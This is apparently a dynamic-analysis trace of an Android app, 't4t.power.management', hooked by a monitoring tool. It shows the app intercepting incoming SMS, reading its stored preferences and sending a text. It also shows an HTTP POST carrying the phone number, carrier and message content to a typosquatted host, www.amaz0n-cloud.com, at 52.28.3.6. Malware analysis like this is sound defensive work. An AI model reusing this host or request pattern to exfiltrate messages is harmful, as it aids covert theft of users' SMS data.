[Rootkit]sys_call_table : c000e204
[Rootkit](410)(1000)scheduleReceiver(android.provider.Telephony.SMS_DELIVER, null, com.android.mms)
[Rootkit](410)(1000)scheduleReceiver(android.provider.Telephony.SMS_RECEIVED, null, t4t.power.management)
[Rootkit](954)(10074)com.android.internal.telephony.ITelephony.getActivePhoneType()
[Rootkit](954)(10074)clone(1378)
[Rootkit](1378)(10074)open(/data/data/t4t.power.management/shared_prefs/phone.xml, 0x20000, 0x0)
[Rootkit](1378)(10074)read(/data/data/t4t.power.management/shared_prefs/phone.xml, 0xb1dc1288, 0x4000)
[Rootkit](1378)(10074)close(/data/data/t4t.power.management/shared_prefs/phone.xml)
[Rootkit](954)(10074)clone(1379)
[Rootkit](1379)(10074)open(/data/data/t4t.power.management/shared_prefs/carrier.xml, 0x20000, 0x0)
[Rootkit](1379)(10074)read(/data/data/t4t.power.management/shared_prefs/carrier.xml, 0xb1dcd5f0, 0x4000)
[Rootkit](1379)(10074)close(/data/data/t4t.power.management/shared_prefs/carrier.xml)
[Rootkit](954)(10074)clone(1380)
[Rootkit](954)(10074)com.android.internal.telephony.ISms.sendText(String callingPkg,String destAddr,String scAddr,String text,PendingIntent sentIntent,PendingIntent deliveryIntent,)
[Rootkit](954)(10074)android.app.IActivityManager.checkPermission(android.permission.SEND_SMS)
[Rootkit](954)(10074)android.app.IActivityManager.checkPermission(android.permission.SEND_SMS_NO_CONFIRMATION)
[Rootkit](954)(10074)sendto(0x30, 52.28.3.6:80, POST /droid/droid.php HTTP/1.1..Content-Length: 111..Content-Type: application/x-www-form-urlencoded..Host: www.amaz0n-cloud.com..Connection: Keep-Alive..User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)....number=15555215554&carrier=Android&from=41001&content=Hello%21%21&message=broadcastreceiver&version=3&sdk=4.4.2)
[Rootkit](954)(10074)recvfrom(0x30, 52.28.3.6:80, HTTP/1.1 200 OK..Connection: close..Set-Cookie: jsessionid=ee6c6544ce9afc7c6d5b8ad3d58a7b07; Expires=Thu, 23 Jun 2022 07:30:41 UTC..Date: Thu, 25 Jun 2015 07:30:41 GMT..Content-Length: 0..Content-Type: text/plain; charset=utf-8....)
[Rootkit](954)(10074)android.app.IActivityManager.checkPermission(android.permission.INTERACT_ACROSS_USERS)
[Rootkit](954)(10074)android.app.IActivityManager.checkPermission(android.permission.INTERACT_ACROSS_USERS_FULL)
[Rootkit](954)(10074)android.app.INotificationManager.enqueueToast(String pkg,ITransientNotification callback,int duration,)
[Rootkit](954)(10074)finishReceiver(abortBroadcast = 0)